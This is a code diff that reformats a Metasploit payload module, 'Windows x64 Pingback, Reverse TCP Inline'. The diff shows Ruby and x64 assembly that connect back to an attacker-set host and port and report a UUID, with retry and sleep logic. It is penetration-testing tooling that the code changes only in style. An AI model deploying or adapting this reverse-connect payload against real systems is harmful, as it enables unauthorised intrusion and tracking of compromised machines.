@@ -4,7 +4,6 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 425
 
   include Msf::Payload::Windows
@@ -15,16 +14,19 @@ module MetasploitModule
   include Msf::Payload::Windows::Exitfunk_x64
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows x64 Pingback, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and report UUID (Windows x64)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
 
     def required_space
       # Start with our cached default generated size
@@ -39,18 +41,17 @@ module MetasploitModule
     def generate(_opts = {})
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
-      encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || "127.127.127.127").unpack("V").first
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
+      encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack('N').first
+      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
+      encoded_host_port = '0x%.8x%.8x' % [encoded_host, encoded_port]
       retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
       pingback_count = datastore['PingbackRetries']
       pingback_sleep = datastore['PingbackSleep']
-      self.pingback_uuid ||= self.generate_pingback_uuid
-      uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
+      self.pingback_uuid ||= generate_pingback_uuid
+      uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
       conf = { exitfunk: datastore['EXITFUNC'] }
 
-
-      asm = %Q^
+      asm = %^
         cld                     ; Clear the direction flag.
         and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
         call start              ; Call start, this pushes the address of 'api_call' onto the stack.
@@ -223,7 +224,7 @@ module MetasploitModule
 
         send_pingback:
           xor r9, r9              ; flags
-          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
+          push #{uuid_as_db.split(',').length} ; length of the PINGBACK UUID
           pop r8
           call get_pingback_address  ; put uuid buffer on the stack
           db #{uuid_as_db}  ; PINGBACK_UUID
@@ -240,12 +241,12 @@ module MetasploitModule
           call rbp               ; call closesocket
         ^
       if pingback_count > 0
-        asm << %Q^
+        asm << %^
           sleep:
             test r15, r15         ; check pingback retry counter
             jz exitfunk           ; bail if we are at 0
             dec r15               ;decrement the pingback retry counter
-            push #{(pingback_sleep * 1000)}            ; 10 seconds
+            push #{pingback_sleep * 1000}            ; 10 seconds
             pop rcx               ; set the sleep function parameter
             mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
             call rbp              ; Sleep()
